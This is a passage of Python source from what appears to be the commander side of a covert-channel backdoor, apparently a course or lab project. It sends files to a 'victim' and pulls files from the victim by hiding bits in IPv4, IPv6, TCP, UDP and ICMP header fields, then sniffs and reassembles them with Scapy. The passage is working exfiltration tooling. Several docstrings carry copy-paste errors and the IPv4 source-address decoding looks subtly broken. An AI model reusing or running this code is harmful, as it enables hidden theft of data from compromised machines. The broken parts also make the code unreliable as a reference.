        ("IPv4", "DS (Differentiated Services Codepoint)"): transfer_file_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): transfer_file_ipv4_ecn,
        ("IPv4", "Total Length"): transfer_file_ipv4_total_length,
        ("IPv4", "Identification"): transfer_file_ipv4_identification,
        ("IPv4", "Flags"): transfer_file_ipv4_flags,
        ("IPv4", "Fragment Offset"): transfer_file_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): transfer_file_ipv4_ttl,
        ("IPv4", "Protocol"): transfer_file_ipv4_protocol,
        ("IPv4", "Header Checksum"): transfer_file_ipv4_header_chksum,
        ("IPv4", "Source Address"): transfer_file_ipv4_src_addr,
        ("IPv4", "Destination Address"): transfer_file_ipv4_dst_addr,

        # b) IPv6 Handlers
        ("IPv6", "Version"): transfer_file_ipv6_version,
        ("IPv6", "Traffic Class"): transfer_file_ipv6_traffic_class,
        ("IPv6", "Flow Label"): transfer_file_ipv6_flow_label,
        ("IPv6", "Payload Length"): transfer_file_ipv6_payload_length,
        ("IPv6", "Next Header"): transfer_file_ipv6_next_header,
        ("IPv6", "Hop Limit"): transfer_file_ipv6_hop_limit,
        ("IPv6", "Source Address"): transfer_file_ipv6_src_addr,
        ("IPv6", "Destination Address"): transfer_file_ipv6_dest_addr,

        # c) TCP Handlers
        ("TCP", "Source Port"): transfer_file_tcp_src_port,
        ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
        ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
        ("TCP", "Acknowledgement Number"): transfer_file_tcp_ack_num,
        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,
        ("TCP", "Reserved"): transfer_file_tcp_reserved,
        ("TCP", "Flags"): transfer_file_tcp_flags,
        ("TCP", "Window Size"): transfer_file_tcp_window_size,
        ("TCP", "Checksum"): transfer_file_tcp_chksum,
        ("TCP", "Urgent Pointer"): transfer_file_tcp_urgent_ptr,
        ("TCP", "Options"): transfer_file_tcp_options,

        # d) UDP Handlers
        ("UDP", "Source Port"): transfer_file_udp_src_port,
        ("UDP", "Destination Port"): transfer_file_udp_dst_port,
        ("UDP", "Length"): transfer_file_udp_length,
        ("UDP", "Checksum"): transfer_file_udp_chksum,

        # e) ICMP Handlers
        ("ICMP", "Type (Type of Message)"): transfer_file_icmp_type,
        ("ICMP", "Code"): transfer_file_icmp_code,
        ("ICMP", "Checksum"): transfer_file_icmp_chksum,
        ("ICMP", "Identifier"): transfer_file_icmp_identification,
        ("ICMP", "Sequence Number"): transfer_file_icmp_seq_num,
    }


def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
                         source_ip: str, source_port: int, choices: tuple):
    # Initialize map
    header_field_function_map = __get_protocol_header_transfer_function_map()

    # Get User Input for File + Check if Exists
    file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))

    # Check if the file exists
    if os.path.exists(file_path):
        print(constants.TRANSFER_FILE_FOUND_MSG.format(file_path))
        print(constants.TRANSFER_FILE_INIT_MSG.format(file_path))

        # Parse File Name
        parsed_file_path = file_path.split("/")
        file_name = parsed_file_path[-1]

        # Send the notification to the victim that a file transfer is about to occur
        sock.send(constants.TRANSFER_FILE_SIGNAL.encode())
        ack = sock.recv(constants.MIN_BUFFER_SIZE).decode()

        # Open and Read the file to be sent
        if ack == constants.RECEIVED_CONFIRMATION_MSG:
            # Send file name and choices
            sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())

            # Find the choice(header/field) in map, get and call the mapped function
            if choices in header_field_function_map:
                selected_function = header_field_function_map.get(choices)

                # DIFFERENT HANDLERS: IPv4
                if constants.IPV4 in choices:
                    if constants.SOURCE_ADDRESS_FIELD in choices:
                        selected_function(sock, dest_ip, dest_port, source_port, file_path)

                    elif selected_function is not None and callable(selected_function):
                        selected_function(sock, dest_ip, file_path)

                # DIFFERENT HANDLERS: IPv6
                elif constants.IPV6 in choices:
                    if constants.DESTINATION_ADDRESS_FIELD in choices:
                        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
                        return None

                    # Get victim IPv6 address and port
                    dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
                    selected_function(sock, dest_ip, dest_port, file_path)

                # DIFFERENT HANDLERS: TCP or UDP
                elif constants.TCP in choices or constants.UDP in choices:
                    selected_function(sock, dest_ip, dest_port, source_port, file_path)

                # DIFFERENT HANDLERS: ICMP
                elif constants.ICMP in choices:
                    selected_function(sock, dest_ip, file_path)

                else:
                    print(constants.CALL_MAP_FUNCTION_ERROR)
                    return None
            else:
                print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
                return None

            # Get an ACK from the victim for success
            transfer_result = sock.recv(constants.BYTE_LIMIT).decode()

            if transfer_result == constants.VICTIM_ACK:
                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
                                                                dest_ip,
                                                                dest_port))
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
            else:
                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return constants.FILE_DNE


# ========================== EXTRACT COVERT DATA FUNCTIONS ==========================


def __bin_to_bytes(binary_string):
    return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))


def covert_data_write_to_file(covert_data: str, filename: str):
    """
    Creates a file (if does not exist) and writes binary data to the file.

    @param covert_data:
        A string containing binary data

    @param filename:
        A string containing the file name

    @return: None
    """
    if covert_data:
        data = (__bin_to_bytes(covert_data)
                .replace(constants.NULL_BYTE, b'')
                .replace(constants.STX_BYTE, b''))

        with open(filename, constants.WRITE_BINARY_MODE) as f:
            f.write(data)


def get_packet_count(client_socket: socket):
    """
    Returns the total number of packets from commander for
    accurate Scapy sniff functionality.

    @param client_socket:
        The client socket

    @return: count
        An integer containing the total number of packets
        to be received
    """
    count = int(client_socket.recv(1024).decode())
    print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
    return count


# ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_ipv4_ttl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ttl field.

    @note Bit length
        The version field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from ttl field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ttl
        binary_data = format(covert_data, constants.EIGHT_BIT)  # Adjust to 8 bits for each character
        return binary_data


def extract_data_ipv4_version(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from version field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].version
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ihl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified IHL field.

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from IHL field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ihl
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ds(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos >> 2) & 0b111111  # Get the first six bits of TOS (starting from most sig. bit)
        binary_data = format(covert_data, constants.SIX_BIT)  # Adjust to 6 bits for each character
        return binary_data


def extract_data_ipv4_ecn(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos & 0b11)  # Get the last two bits of TOS (starting from least sig. bit)
        binary_data = format(covert_data, constants.TWO_BIT)
        return binary_data


def extract_data_ipv4_total_length(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].len
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_identification(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].id
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_flags(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = int(packet[IP].flags)
        binary_data = format(covert_data, constants.THREE_BIT)
        return binary_data


def extract_data_ipv4_frag_offset(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].frag
        binary_data = format(covert_data, constants.THIRTEEN_BIT)
        return binary_data


def extract_data_ipv4_protocol(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].proto
        binary_data = format(covert_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv4_header_chksum(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].chksum
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_src_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].src

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.THIRTY_TWO_BIT)

        return binary_data


def extract_data_ipv4_dst_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @attention Functionality Disabled
        This is not used

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].dst

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.EIGHT_BIT)

        return binary_data


# ===================== IPV6 EXTRACT COVERT DATA FUNCTIONS =====================


def __is_valid_ipv6(address: str):
    try:
        ipaddress.IPv6Address(address)
        return True
    except ipaddress.AddressValueError as e:
        print(constants.INVALID_IPV6_ERROR.format(e))
        return False


def extract_data_ipv6_version(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified version field.

    @note Bit length
        The version field for IPv6 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        version = packet[IPv6].version
        binary_data = format(version, constants.FOUR_BIT)
        return binary_data


def extract_data_ipv6_traffic_class(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified traffic class field.

    @note Bit length
        The traffic class field for IPv6 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        traffic_class_data = packet[IPv6].tc
        binary_data = format(traffic_class_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_flow_label(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified flow label field.

    @note Bit length
        The flow label field for IPv6 headers is 20 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        flow_label_data = packet[IPv6].fl
        binary_data = format(flow_label_data, constants.TWENTY_BIT)
        return binary_data


def extract_data_ipv6_payload_length(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified payload length field.

    @note Bit length
        The payload length field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        payload_length_data = packet[IPv6].plen
        binary_data = format(payload_length_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv6_next_header(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified next header field.

    @note Bit length
        The next header field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        next_header_data = packet[IPv6].nh
        binary_data = format(next_header_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_hop_limit(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified hop limit field.

    @note Bit length
        The hop limit field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        hop_limit_data = packet[IPv6].hlim
        binary_data = format(hop_limit_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_src_addr(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified source address field.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (12 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        source_address = packet[IPv6].src
        binary_data = ''.join(format(int(byte, 16), '08b') for byte in source_address.replace(':', ''))
        return binary_data


def extract_data_ipv6_dst_addr(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified destination address field.

    @attention FUNCTIONALITY DISABLED
        This is not used

    @note Bit length
        The source address field for IPv6 headers is 128 bits (12 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    return None


# ===================== TCP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_tcp_src_port(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified source port field.

    @note Bit length
        The source port field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        src_port_data = packet[TCP].sport
        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_dst_port(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified destination port field.

    @note Bit length
        The destination port field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        dst_port_data = packet[TCP].dport
        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_seq_num(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified sequence number field.

    @note Bit length
        The sequence number field for IPv6 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        seq_num_data = packet[TCP].seq
        binary_data = format(seq_num_data, constants.THIRTY_TWO_BIT)
        return binary_data


def extract_data_tcp_ack_num(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified acknowledgement number field.

    @note Bit length
        The acknowledgement number field for IPv6 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        ack_num_data = packet[TCP].ack
        binary_data = format(ack_num_data, constants.THIRTY_TWO_BIT)
        return binary_data


def extract_data_tcp_data_offset(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified data offset field.

    @note Bit length
        The data offset field for IPv6 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        data_offset_data = packet[TCP].dataofs
        binary_data = format(data_offset_data, constants.FOUR_BIT)
        return binary_data


def extract_data_tcp_reserved(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified reserved field.

    @note Bit length
        The reserved field for IPv6 headers is 3 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        reserved_data = packet[TCP].reserved
        binary_data = format(reserved_data, constants.THREE_BIT)
        return binary_data


def extract_data_tcp_flags(packet):
    """
    A handler function to extract data from packets with TCP
    header and several modified flag fields.

    @note Bit length
        The flags field for TCP headers is 9 bits for the different
        flags (ECN, ACK, SYN, FIN, etc.)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        flag_data = int(packet[TCP].flags)
        binary_data = format(flag_data, constants.NINE_BIT)
        return binary_data


def extract_data_tcp_window_size(packet):
    """
    A handler function to extract data from packets with TCP
    header and window size field.

    @note Bit length
        The window field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        window_data = packet[TCP].window
        binary_data = format(window_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_chksum(packet):
    """
    A handler function to extract data from packets with TCP
    header and checksum field.

    @note Bit length
        The checksum field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        chksum_data = packet[TCP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_urgent_ptr(packet):
    """
    A handler function to extract data from packets with TCP
    header and urgent pointer field.

    @note Bit length
        The urgent pointer field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        urg_ptr_data = packet[TCP].urgptr
        binary_data = format(urg_ptr_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_options(packet):
    """
    A handler function to extract data from packets with TCP
    header and TimeStamp options field.

    @note Bit length
        The options field for TCP headers is maximum 320 bits (40 bytes)
        16 bits chosen here for TimeStamp option

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        timestamp_option = packet[TCP].options[0][1][0]
        binary_data = format(timestamp_option, constants.SIXTEEN_BIT)
        return binary_data


# ===================== UDP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_udp_src_port(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified source port field.

    @note Bit length
        The source port field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        src_port_data = packet[UDP].sport
        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_dst_port(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified destination port field.

    @note Bit length
        The destination port field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        dst_port_data = packet[UDP].dport
        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_length(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified length field.

    @note Bit length
        The length field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        length_data = packet[UDP].len
        binary_data = format(length_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_chksum(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified checksum field.

    @note Bit length
        The checksum field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        chksum_data = packet[UDP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


# ===================== ICMP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_icmp_type(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified type field.

    @note Bit length
        The type field for ICMP headers is maximum 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        type_data = packet[ICMP].type
        binary_data = format(type_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_icmp_code(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified code field.

    @note Bit length
        The code field for ICMP headers is maximum 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        code_data = packet[ICMP].code
        binary_data = format(code_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_icmp_chksum(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified checksum field.

    @note Bit length
        The checksum field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        chksum_data = packet[ICMP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_icmp_identification(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified identification field.

    @note Bit length
        The identification field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        id_data = packet[ICMP].id
        binary_data = format(id_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_icmp_seq_num(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified sequence number field.

    @note Bit length
        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        seq_num_data = packet[ICMP].seq
        binary_data = format(seq_num_data, constants.SIXTEEN_BIT)
        return binary_data


def get_protocol_header_function_extract_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): extract_data_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): extract_data_ipv4_ihl,
        ("IPv4", "DS (Differentiated Services Codepoint)"): extract_data_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): extract_data_ipv4_ecn,
        ("IPv4", "Total Length"): extract_data_ipv4_total_length,
        ("IPv4", "Identification"): extract_data_ipv4_identification,
        ("IPv4", "Flags"): extract_data_ipv4_flags,
        ("IPv4", "Fragment Offset"): extract_data_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): extract_data_ipv4_ttl,
        ("IPv4", "Protocol"): extract_data_ipv4_protocol,
        ("IPv4", "Header Checksum"): extract_data_ipv4_header_chksum,
        ("IPv4", "Source Address"): extract_data_ipv4_src_addr,
        ("IPv4", "Destination Address"): extract_data_ipv4_dst_addr,

        # b) IPv6 Handlers
        ("IPv6", "Version"): extract_data_ipv6_version,
        ("IPv6", "Traffic Class"): extract_data_ipv6_traffic_class,
        ("IPv6", "Flow Label"): extract_data_ipv6_flow_label,
        ("IPv6", "Payload Length"): extract_data_ipv6_payload_length,
        ("IPv6", "Next Header"): extract_data_ipv6_next_header,
        ("IPv6", "Hop Limit"): extract_data_ipv6_hop_limit,
        ("IPv6", "Source Address"): extract_data_ipv6_src_addr,
        ("IPv6", "Destination Address"): extract_data_ipv6_dst_addr,

        # c) TCP Handlers
        ("TCP", "Source Port"): extract_data_tcp_src_port,
        ("TCP", "Destination Port"): extract_data_tcp_dst_port,
        ("TCP", "Sequence Number"): extract_data_tcp_seq_num,
        ("TCP", "Acknowledgement Number"): extract_data_tcp_ack_num,
        ("TCP", "Data Offset"): extract_data_tcp_data_offset,
        ("TCP", "Reserved"): extract_data_tcp_reserved,
        ("TCP", "Flags"): extract_data_tcp_flags,
        ("TCP", "Window Size"): extract_data_tcp_window_size,
        ("TCP", "Checksum"): extract_data_tcp_chksum,
        ("TCP", "Urgent Pointer"): extract_data_tcp_urgent_ptr,
        ("TCP", "Options"): extract_data_tcp_options,

        # d) UDP Handlers
        ("UDP", "Source Port"): extract_data_udp_src_port,
        ("UDP", "Destination Port"): extract_data_udp_dst_port,
        ("UDP", "Length"): extract_data_udp_length,
        ("UDP", "Checksum"): extract_data_udp_chksum,

        # e) ICMP Handlers
        ("ICMP", "Type (Type of Message)"): extract_data_icmp_type,
        ("ICMP", "Code"): extract_data_icmp_code,
        ("ICMP", "Checksum"): extract_data_icmp_chksum,
        ("ICMP", "Identifier"): extract_data_icmp_identification,
        ("ICMP", "Sequence Number"): extract_data_icmp_seq_num,
    }


def receive_file_covert(client_socket: socket.socket,
                        client_ip: str,
                        client_port: int,
                        source_ip: str,
                        source_port: int,
                        choices: tuple):
    # Create Downloads and Client IP directories
    sub_directory_path = __make_main_and_sub_directories(client_ip)

    # Send Signal
    print(constants.GET_FILE_SIGNAL_MSG)
    client_socket.send(constants.GET_FILE_SIGNAL.encode())

    # Get ACK and user file path, check if exists
    res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

    if res == constants.RECEIVED_CONFIRMATION_MSG:
        # Get user prompt (file path + covert channel config)
        received_packets = []
        file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
        file_name = file_path.split("/")[-1]
        save_file_path = sub_directory_path + "/" + file_name

        # Send Data to Client (choice[0, 1] = header, field)
        client_socket.send((file_path + "/" + choices[0] + "/" + choices[1] + "/" + str(source_port)).encode())

        # CHECK: If destination field choice, do nothing
        if constants.DESTINATION_ADDRESS_FIELD in choices:
            __transfer_file_dst_addr_error_handler(choices[1], choices[0])
            return None

        # Wait for response
        res = client_socket.recv(constants.BYTE_LIMIT).decode()

        # Receive File if exists
        if res == constants.GET_FILE_EXIST:
            # Get function handler from a map (according to header/field)
            header_field_function_map = get_protocol_header_function_extract_map()
            if choices in header_field_function_map:
                selected_function = header_field_function_map.get(choices)

            # A callback function for handling of received packets
            def packet_callback(packet):
                global filename
                binary_data = selected_function(packet)
                return binary_data

            # DIFFERENT SNIFFS: For IPv4 Headers/Field
            if constants.IPV4 in choices:
                # Get total count of packets
                count = get_packet_count(client_socket)

                if constants.SOURCE_ADDRESS_FIELD in choices:
                    received_packets = sniff(filter="dst host {} and dst port {}"
                                             .format(source_ip, source_port), count=count)
                else:  # REGULAR IPv4 SNIFF
                    received_packets = sniff(filter="src host {}".format(client_ip), count=count)

            # DIFFERENT SNIFFS: For IPv6 Headers/Field
            if constants.IPV6 in choices:
                # Get own IPv6 address and port
                source_ipv6_ip, source_ipv6_port = determine_ipv6_address()

                # Transfer ipv6_getter.py file to victim/target and get their IPv6 address
                victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)

                # Send own IPv6 address and port
                client_socket.send((source_ipv6_ip + "/" + str(source_ipv6_port)).encode())

                # Get total count of packets
                count = get_packet_count(client_socket)

                if constants.NEXT_HEADER in choices:
                    received_packets = sniff(filter="src host {} and dst host {}"
                                             .format(victim_ipv6_addr, source_ipv6_ip),
                                             count=count)
                else:
                    received_packets = sniff(filter="dst host {} and dst port {}"
                                             .format(source_ipv6_ip, source_ipv6_port),
                                             count=count)

            # DIFFERENT SNIFFS: For TCP Headers/Field
            if constants.TCP in choices:
                count = get_packet_count(client_socket)

                if constants.SOURCE_PORT_FIELD in choices:
                    received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
                                                    "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
                                             .format(source_ip, source_port),
                                             count=count)

                elif constants.DESTINATION_PORT_FIELD in choices:
                    received_packets = sniff(filter="tcp and dst host {} and src host {} and "
                                                    "(tcp[13] & 0x004 == 0)"
                                             .format(source_ip, client_ip),
                                             count=count)

                elif constants.FLAG in choices:  # Capture all flags
                    received_packets = sniff(filter="tcp and dst host {} and dst port {}"
                                             .format(source_ip, source_port),
                                             count=count)
                else:
                    received_packets = sniff(filter="tcp and dst host {} and dst port {} "
                                                    "and tcp[13] & 0x004 == 0"
                                             .format(source_ip, source_port),
                                             count=count)

            # DIFFERENT SNIFFS: For UDP Headers/Field
            if constants.UDP in choices:
                count = get_packet_count(client_socket)

                if constants.DESTINATION_PORT_FIELD in choices:
                    received_packets = sniff(filter="udp and dst host {} and src host {}"
                                             .format(source_ip, client_ip),
                                             count=count)
                else:
                    received_packets = sniff(filter="udp and dst host {} and dst port {}"
                                             .format(source_ip, source_port),
                                             count=count)

            # DIFFERENT SNIFFS: For ICMP Header/Fields
            if constants.ICMP in choices:
                count = get_packet_count(client_socket)

                received_packets = sniff(filter="icmp and dst host {} and src host {}"
                                         .format(source_ip, client_ip),
                                         count=count)

            # Extract Data
            extracted_data = ''.join(packet_callback(packet)
